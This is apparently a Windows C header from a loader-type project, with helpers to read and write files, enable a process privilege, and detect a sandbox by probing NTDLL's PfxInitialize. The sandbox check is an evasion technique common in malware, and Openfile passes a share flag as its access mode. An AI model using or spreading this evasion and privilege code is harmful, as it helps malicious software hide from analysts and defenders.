#pragma once
#include<windows.h>
#include<stdio.h>
#define DATA_SIZE 27136


typedef struct
{
	DWORD size;
	PBYTE ptrbuffer;
}FILEINFO;
FILEINFO Openfile(char* ptrFile)
{
	DWORD dwReadTotal = 0;
	DWORD dwReaded = 0;
	FILEINFO fileinfo = { 0 };
	HANDLE hFile = NULL;
	hFile = CreateFileA(ptrFile,
		FILE_SHARE_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE)
		goto END;

	fileinfo.size = GetFileSize(hFile, NULL);
	if (fileinfo.size == 0)
		goto END;

	fileinfo.ptrbuffer = (byte*)HeapAlloc(GetProcessHeap(), 0, fileinfo.size);
	if (fileinfo.ptrbuffer == 0)
		goto END;
	SecureZeroMemory(fileinfo.ptrbuffer, fileinfo.size);

	while (dwReadTotal < fileinfo.size
		&& ReadFile(hFile, fileinfo.ptrbuffer + dwReadTotal, fileinfo.size - dwReadTotal, &dwReaded, NULL))
	{
		dwReadTotal += dwReaded;
	}
END:
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
	}
	return fileinfo;
};
void* __cdecl Mymemcpy(void* dest,
	const void* src,
	size_t 	count
)
{
	char* char_dest = (char*)dest;
	char* char_src = (char*)src;

	if ((char_dest <= char_src) || (char_dest >= (char_src + count)))
	{
		/*  non-overlapping buffers */
		while (count > 0)
		{
			*char_dest = *char_src;
			char_dest++;
			char_src++;
			count--;
		}
	}
	else
	{
		/* overlaping buffers */
		char_dest = (char*)dest + count - 1;
		char_src = (char*)src + count - 1;

		while (count > 0)
		{
			*char_dest = *char_src;
			char_dest--;
			char_src--;
			count--;
		}
	}

	return dest;
}
BOOL Write2file(PBYTE file, DWORD contentLen, PCHAR path)//写入文件，测试通过
{

	HANDLE pFile;
	PBYTE tmpBuf = nullptr;
	DWORD dwBytesWrite, dwBytesToWrite;

	pFile = CreateFileA(path, GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,        //总是创建文件
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (pFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(pFile);
		HeapFree(GetProcessHeap(), 0, file);
		return FALSE;
	}

	dwBytesToWrite = contentLen;
	dwBytesWrite = 0;

	tmpBuf = file;

	do {                                       //循环写文件，确保完整的文件被写入  

		WriteFile(pFile, tmpBuf, dwBytesToWrite, &dwBytesWrite, NULL);

		dwBytesToWrite -= dwBytesWrite;
		tmpBuf += dwBytesWrite;

	} while (dwBytesToWrite > 0);

	CloseHandle(pFile);
	HeapFree(GetProcessHeap(), 0, file);
	return TRUE;
}

BOOL GrantPriviledge(WCHAR* PriviledgeName)
{
	TOKEN_PRIVILEGES TokenPrivileges, OldPrivileges;
	DWORD			 dwReturnLength = sizeof(OldPrivileges);
	HANDLE			 TokenHandle = NULL;
	LUID			 uID;

	// 打开权限令牌
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &TokenHandle))
	{
		if (GetLastError() != ERROR_NO_TOKEN)
		{
			return FALSE;
		}
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle))
		{
			return FALSE;
		}
	}

	if (!LookupPrivilegeValue(NULL, PriviledgeName, &uID))		// 通过权限名称查找uID
	{
		CloseHandle(TokenHandle);
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;		// 要提升的权限个数
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    // 动态数组，数组大小根据Count的数目
	TokenPrivileges.Privileges[0].Luid = uID;

	// 在这里我们进行调整权限
	if (!AdjustTokenPrivileges(TokenHandle, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), &OldPrivileges, &dwReturnLength))
	{
		CloseHandle(TokenHandle);
		return FALSE;
	}

	// 成功了
	CloseHandle(TokenHandle);
	return TRUE;
}
BOOL IsSandbox()
{
	typedef void (*PfxInitialize)(LPVOID result);
	PfxInitialize PFX = (PfxInitialize)GetProcAddress(GetModuleHandleW(L"NTDLL"),"PfxInitialize");

	typedef struct _Pfx
	{
		DWORD Data1;
		DWORD Data2;
		DWORD Data3;

	}Pfx;
	Pfx pfx = { 0 };
	PFX( &pfx );
	if (pfx.Data1 == 0x200)
	{
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}
